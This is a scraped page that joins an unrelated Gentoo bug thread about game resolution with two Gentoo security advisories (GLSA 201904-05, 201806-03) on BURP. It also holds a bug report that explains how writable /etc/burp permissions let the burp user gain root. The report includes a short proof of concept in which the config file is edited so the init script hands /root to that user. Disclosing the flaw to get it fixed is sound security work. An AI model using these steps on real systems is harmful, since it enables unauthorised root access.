The resolution issue appears to be with your local client, as I have no problems with the game without making that change.  Do you have all of the standard video modes defined in your X config file? ```  [Comment 5](#c5)  Greg Yasko    2004-09-29 08:32:07 UTC  ``` I have all the resolutions in my xorg.conf, but just recently found out that my video drivers were corrupted, and had to re-merge them. That may have been the resolution problem. ```  [Comment 6](#c6)  Chris Gianelloni (RETIRED)   gentoo-dev  2004-09-29 16:50:31 UTC  ``` Well.... I'm marking this one FIXED then... ``` |  |

# BURP: Root privilege escalation — GLSA **201904-05**

A vulnerability was discovered in Gentoo's ebuild for BURP which
could lead to root privilege escalation.

### Affected packages

| Package | **app-backup/burp** on all architectures |
| --- | --- |
| Affected versions | < **2.1.32-r1** |
| Unaffected versions | >= **2.1.32-r1** |

### Background

A network backup and restore program.

### Description

It was discovered that Gentoo’s BURP ebuild does not properly set
permissions or place the pid file in a safe directory. Additionally, the
first set of patches did not completely address this. As such, a
revision has been made available that addresses all concerns of the
initial report.

### Impact

A local attacker could escalate privileges.

### Workaround

Users should ensure the proper permissions are set as discussed in the
referenced bugs.

### Resolution

All BURP users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=app-backup/burp-2.1.32-r1"

```
### References

* [CVE-2017-18285](https://nvd.nist.gov/vuln/detail/CVE-2017-18285)

**Release date**

April 02, 2019

**Latest revision**

April 02, 2019: 1

**Severity**

normal

**Exploitable**

| [Description](#c0)  Michael Orlitzky   gentoo-dev  2017-12-20 20:10:53 UTC  ``` The configuration directory for burp gets installed writable by the "burp" group :    $ ls -l /etc | grep burp   drwxrwxr-x  6 root burp    4.0K 2017-12-20 14:52 burp  The server configuration file is supposed to be writable only by root, but since /etc/burp is writable by the "burp" group, the server configuration file essentially is too. That can be exploited by the "burp" user to edit the server configuration file, and trick the init script into giving him any file on the machine.  The init script does,    get_backup_dir() {     grep '^directory = ' /etc/burp/burp-server.conf | sed -e 's/^directory = //'   }    start_pre() {     ...     checkpath -o root:burp -m 0770 -d "$(get_backup_dir)"   }  So if the "burp" user makes a clever edit to burp-server.conf, the call to checkpath will give him read/write access to whatever he wants.  Proof of concept:    # Pretend we're the burp user...   $ sudo su burp -s /bin/sh   $ cd /etc/burp    # Set the backup directory to /root   $ sed 's:/var/spool/burp:/root:' burp-server.conf > burp-server.mine   $ rm -f burp-server.conf   $ mv burp-server.mine burp-server.conf   $ exit  Now as root, start the service...    $ sudo /etc/init.d/burp start    * /etc/burp/burp-server.conf: correcting mode    * /etc/burp/burp-server.conf: correcting owner    * /root: correcting mode    * /root: correcting owner    * Starting burp ...  and /root is writable by "burp". ```  [Comment 1](#c1)  Marek Szuba (RETIRED)   archtester gentoo-dev  2017-12-21 14:40:05 UTC  ``` And once again, I received no e-mail notification. Strange. Anyway, looks like this one has been inherited from the previous maintainer...

# BURP: Multiple vulnerabilities — GLSA **201806-03**

Multiple vulnerabilities were discovered in BURP's Gentoo ebuild,
the worst of which could lead to root privilege escalation.

### Affected packages

| Package | **app-backup/burp** on all architectures |
| --- | --- |
| Affected versions | < **2.1.32** |
| Unaffected versions | >= **2.1.32** |

### Background

A network backup and restore program.

### Description

It was discovered that Gentoo’s BURP ebuild does not properly set
permissions or place the pid file in a safe directory.

### Impact

A local attacker could escalate privileges.

### Workaround

Users should ensure the proper permissions are set as discussed in the
referenced bugs.

### Resolution

All BURP users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=app-backup/burp-2.1.32"

```
### References
